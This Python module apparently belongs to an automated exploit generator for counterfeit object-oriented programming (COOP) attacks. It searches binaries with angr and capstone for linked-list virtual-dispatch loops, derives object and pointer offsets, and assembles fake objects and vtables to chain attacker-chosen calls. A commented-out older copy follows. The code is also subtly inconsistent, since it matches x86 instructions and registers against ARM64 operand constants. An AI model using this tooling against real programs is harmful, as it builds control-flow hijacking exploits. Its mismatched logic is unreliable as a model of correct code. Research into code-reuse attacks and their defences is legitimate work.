from autocoop.builder.builder import *
import autocoop.esl_lib.lib_utils.candidate_finder as candidate_finder
import autocoop.esl_lib.lib_utils.capstone_utils as capstone_utils
import logging
import angr
from capstone import arm64
import itertools

def generate_main(app, config, calltargets_order):
    """
    Generates the object dispatch loop gadget and the array builder.

    The the offsets for the object array ptr and the object array length are generated by stepping though the
    disassembled code, from the virtual function call/the loop exit condition, tracking the relevant registers until
    the offset is found.

    :param angr.Project app: application the gadget will be found for
    :param Config config: configuration of the exploit generator
    :param list[int] calltargets_order: list of calltargets in the order they are called in
    :return: Array builder object ready for more objects to be added and vptr offset

    """
    logger = logging.getLogger("autocoop.esl_lib.mainloop")
    logger.info("[*] Building Callsite Candidate Set")
    # app.analyses.CFGFast()
    if config.other_args.get("policy", None):
        candidates = list(candidate_finder.get_candidate_callsites_from_csv(app, config.other_args["gadget_csv"]))
    else:
        candidates = list(candidate_finder.get_all_functions(app))
    for vtable, gadget, callsite, calltargets_raw in candidates:
        logger.info("[*] Evaluating potential LINKEDLIST gadget: {}".format(gadget))
        insns = capstone_utils.get_function_capstone(app, gadget)
        # 1. find call
        # 2. find target object offset
        # 3. find exit condition
        # 4. find node origin
        # 5. find next node offset
        call_index = 0
        while call_index < len(insns):
            if insns[call_index].mnemonic == "call":
                break
            call_index += 1
        else:
            continue
        logger.info("[!] Finished step 1 (find call): {}".format(gadget))
        call_ins = insns[call_index]
        if call_ins.mnemonic != "call":
            continue
        if len(call_ins.operands) != 1:
            continue
        operand = call_ins.operands[0]
        if operand.type != arm64.ARM64_OP_MEM:
            continue
        if operand.mem.base == 0:
            continue
        config.vptr_offset = operand.mem.disp / 8

        target_object_offset = None
        first_deref_found = False
        target_obj_index = call_index
        reg = operand.mem.base
        app.kb.virtual_dispatch = not  "rdi" == call_ins.insn.reg_name(reg)

        while target_obj_index > 0:
            target_obj_index -= 1
            res = capstone_utils.find_reg_source(insns[target_obj_index], reg)
            if not res:
                continue
            if not first_deref_found:
                reg, _, _, _ = res
                first_deref_found = True
            else:
                reg, target_object_offset, _, _ = res
                break

        logger.info("[!] Finished step 2 (find target object offset): {}".format(gadget))

        condition_index = call_index
        visited = set()
        reg = None
        invalid = False
        while condition_index and condition_index+1 < len(insns) and condition_index+1 not in visited:
            condition_index += 1
            visited.add(condition_index)
            insn = insns[condition_index].insn
            if insn.mnemonic == "jmp":
                if insn.operands[0].type == arm64.ARM64_OP_IMM:
                    target = insn.operands[0].imm
                    condition_index = capstone_utils.find_index_for_addr(insns, target)
            elif insn.mnemonic.startswith("j"):
                if capstone_utils.find_index_for_addr(insns, insn.operands[0].imm) <= call_index:
                    condition_index -= 1
                    insn = insns[condition_index].insn

                    if insn.mnemonic == "test":
                        if insn.operands[0].type == arm64.ARM64_OP_REG:
                            reg = insn.operands[0].reg
                            break
                    else:
                        invalid = True
        else:
            continue
        if invalid:
            continue

        logger.info("[!] Finished step 3 (find exit condition): {}".format(gadget))

        index = condition_index
        node_origin = None
        while index > 0:
            index -= 1
            insn = insns[index].insn
            res = capstone_utils.find_reg_source(insn, reg)
            if res:
                node_origin = res
                break
        else:
            continue

        node_origin_offset = node_origin[1]
        logger.info("[!] Finished step 4 (find node origin): {}".format(gadget))

        source_reg = None
        while index > 0:
            index -= 1
            insn = insns[index].insn
            if "mov" in insn.mnemonic:
                operand = insn.operands[0]
                if node_origin == (operand.mem.base, operand.mem.disp, operand.mem.index, operand.mem.scale):
                    source_reg = insn.operands[1].reg
                    break
        else:
            continue
        if not source_reg:
            continue

        next_node_offset = None
        while index > 0:
            index -= 1
            insn = insns[index].insn
            res = capstone_utils.find_reg_source(insn, source_reg)
            if res:
                _, next_node_offset, _, _ = res
                break
        else:
            continue

        logger.info("[!] Finished step 5 (find next node offset): {}".format(gadget))

        if vtable == 1:
            initObj = Object(vIndex=0, vFunc=vtable, noFakeVtable=False, fixedOffset=0)
        else:
            initObj = Obj64(fixedOffset=0)
            initObj.setVptr(vtable)

        initObj.mem.addUnresolvedPointer(node_origin_offset, LinkedListBuilder.LABEL_BASE_LL)
        initObj.setLabel(532523)
        b = LinkedListBuilder(config.base_buf, offsetPtrObj=target_object_offset, offsetPtrNext=next_node_offset, mainObj=initObj, arch=Arch.X64, node_origin_offset=node_origin_offset)
        app.kb.next_node_offset = node_origin_offset
        app.kb.initial_object_label = 532523
        if calltargets_raw:
            calltargets = candidate_finder.get_candidate_gadgets_from_line(app, calltargets_raw, config.other_args["policy"])
        else:
            calltargets = candidate_finder.get_all_functions(app)

        # import IPython; IPython.embed()
        yield b, gadget, calltargets
    raise StopIteration("No candidate callsites left.")


def update_main(ll_builder, calltargets):
    """
    Adds objects to array builder

    :param ll_builder: Linked List builder to add objects to
    :param list calltargets: list of calltargets and builder objects
    """
    labels = {}
    for i, (_, gadget, _) in enumerate(calltargets):
        if hasattr(gadget, "target_value"):
            # if not gadget.label:
            #     gadget.label = gadget.target_addr_label
            # labels[gadget.label] = gadget.target_addr_label
            labels[gadget.conditional_label] = gadget.target_value
    for i, (_, gadget, obj) in enumerate(calltargets):
        lastObj = (i == len(calltargets) -1) and not gadget.next_label
        if gadget.label and gadget.label not in labels:
            labels[gadget.label] = ll_builder.labelLl
        if gadget.next_label and gadget.next_label not in labels:
            labels[gadget.next_label] = hash(gadget.next_label)

        if not (i == len(calltargets) - 1):
            next_object = calltargets[i+1][1]
            if next_object.label:
                gadget.next_label = next_object.label
        ll_builder.addObj(obj, labelNextItem=labels.get(gadget.next_label, None), labelItem=labels.get(gadget.label, None), lastObj=lastObj)


gadget = generate_main, update_main


# from autocoop.builder.builder import *
# import autocoop.esl_lib.lib_utils.candidate_finder as candidate_finder
# import autocoop.esl_lib.lib_utils.capstone_utils as capstone_utils
# import logging
# import angr
# from capstone import arm64


# import itertools
#
# def generate_main(app, config, calltargets_order):
#     """
#     Generates the object dispatch loop gadget and the array builder.
#
#     The the offsets for the object array ptr and the object array length are generated by stepping though the
#     disassembled code, from the virtual function call/the loop exit condition, tracking the relevant registers until
#     the offset is found.
#
#     :param angr.Project app: application the gadget will be found for
#     :param Config config: configuration of the exploit generator
#     :param list[int] calltargets_order: list of calltargets in the order they are called in
#     :return: Array builder object ready for more objects to be added and vptr offset
#
#     """
#     logger = logging.getLogger("autocoop.esl_lib.mainloop")
#     logger.info("[*] Building Callsite Candidate Set")
#     # app.analyses.CFGFast()
#     # candidates = list(candidate_finder.get_candidate_callsites_from_csv(app, config.other_args["gadget_csv"]))
#     candidates = list(candidate_finder.get_all_functions(app))
#     for vtable, gadget in candidates:
#         if "ngx_thread_pool_cycle" in gadget.name:
#             insns = capstone_utils.get_function_capstone_print(app, gadget)
#         logger.info("[*] Evaluating potential FNLINKEDLIST gadget: {}".format(gadget))
#         insns = capstone_utils.get_function_capstone(app, gadget)
#         # 1. find call
#         # 2. find target object offset
#         # 3. find exit condition
#         # 4. find node origin
#         # 5. find next node offset
#         call_index = -1
#         while call_index < len(insns)-1:
#             call_index += 1
#             if insns[call_index].mnemonic == "call":
#                 logger.info("[!] Finished step 1 (find call): {}".format(gadget))
#                 call_ins = insns[call_index]
#                 if call_ins.mnemonic != "call":
#                     continue
#                 if len(call_ins.operands) != 1:
#                     continue
#                 operand = call_ins.operands[0]
#                 if operand.type != arm64.ARM64_OP_MEM:
#                     continue
#                 if operand.mem.base == 0:
#                     continue
#                 config.vptr_offset = operand.mem.disp / 8
#
#                 target_object_offset = None
#                 first_deref_found = False
#                 target_obj_index = call_index
#                 reg = operand.mem.base
#
#                 while target_obj_index > 0:
#                     target_obj_index -= 1
#                     res = capstone_utils.find_reg_source(insns[target_obj_index], reg)
#                     if not res:
#                         continue
#                     if not first_deref_found:
#                         reg, _, _, _ = res
#                         first_deref_found = True
#                     else:
#                         reg, target_object_offset, _, _ = res
#                         break
#
#                 logger.info("[!] Finished step 2 (find target object offset): {}".format(gadget))
#
#                 condition_index = call_index
#                 visited = set()
#                 reg = None
#                 invalid = False
#                 while condition_index and condition_index + 1 < len(insns) and condition_index + 1 not in visited:
#                     condition_index += 1
#                     visited.add(condition_index)
#                     insn = insns[condition_index].insn
#                     if insn.mnemonic == "jmp":
#                         if insn.operands[0].type == arm64.ARM64_OP_IMM:
#                             target = insn.operands[0].imm
#                             condition_index = capstone_utils.find_index_for_addr(insns, target)
#                     elif insn.mnemonic.startswith("j"):
#                         if capstone_utils.find_index_for_addr(insns, insn.operands[0].imm) <= call_index:
#                             condition_index -= 1
#                             insn = insns[condition_index].insn
#
#                             if insn.mnemonic == "test":
#                                 if insn.operands[0].type == arm64.ARM64_OP_REG:
#                                     reg = insn.operands[0].reg
#                                     break
#                             else:
#                                 invalid = True
#                 else:
#                     continue
#                 if invalid:
#                     continue
#
#                 logger.info("[!] Finished step 3 (find exit condition): {}".format(gadget))
#
#                 index = condition_index
#                 node_origin = None
#                 while index > 0:
#                     index -= 1
#                     insn = insns[index].insn
#                     res = capstone_utils.find_reg_source(insn, reg)
#                     if res:
#                         node_origin = res
#                         break
#                 else:
#                     continue
#
#                 node_origin_offset = node_origin[1]
#                 logger.info("[!] Finished step 4 (find node origin): {}".format(gadget))
#
#                 source_reg = None
#                 while index > 0:
#                     index -= 1
#                     insn = insns[index].insn
#                     if "mov" in insn.mnemonic:
#                         operand = insn.operands[0]
#                         if node_origin == (operand.mem.base, operand.mem.disp, operand.mem.index, operand.mem.scale):
#                             source_reg = insn.operands[1].reg
#                             break
#                 else:
#                     continue
#                 if not source_reg:
#                     continue
#
#                 next_node_offset = None
#                 while index > 0:
#                     index -= 1
#                     insn = insns[index].insn
#                     res = capstone_utils.find_reg_source(insn, source_reg)
#                     if res:
#                         _, next_node_offset, _, _ = res
#                         break
#                 else:
#                     continue
#
#                 logger.info("[!] Finished step 5 (find next node offset): {}".format(gadget))
#
#                 if vtable == 1:
#                     initObj = Object(vIndex=0, vFunc=vtable, noFakeVtable=False, fixedOffset=0)
#                 else:
#                     initObj = Obj64(fixedOffset=0)
#                     initObj.setVptr(vtable)
#
#                 initObj.mem.addUnresolvedPointer(node_origin_offset, LinkedListBuilder.LABEL_BASE_LL)
#
#                 b = LinkedListBuilder(config.base_buf, offsetPtrObj=target_object_offset,
#                                       offsetPtrNext=next_node_offset, mainObj=initObj, arch=Arch.X64)
#                 calltargets = candidate_finder.get_all_functions(app)
#
#                 # import IPython; IPython.embed()
#                 yield b, gadget, calltargets
#         else:
#             continue
#     raise StopIteration("No candidate callsites left.")
#
#
# def update_main(ll_builder, calltargets):
#     """
#     Adds objects to array builder
#
#     :param ll_builder: Linked List builder to add objects to
#     :param list calltargets: list of calltargets and builder objects
#     """
#     for i, (_, _, obj) in enumerate(calltargets):
#         lastObj = i == len(calltargets) -1
#         ll_builder.addObj(obj, lastObj=lastObj)
#
#
# gadget = generate_main, update_main
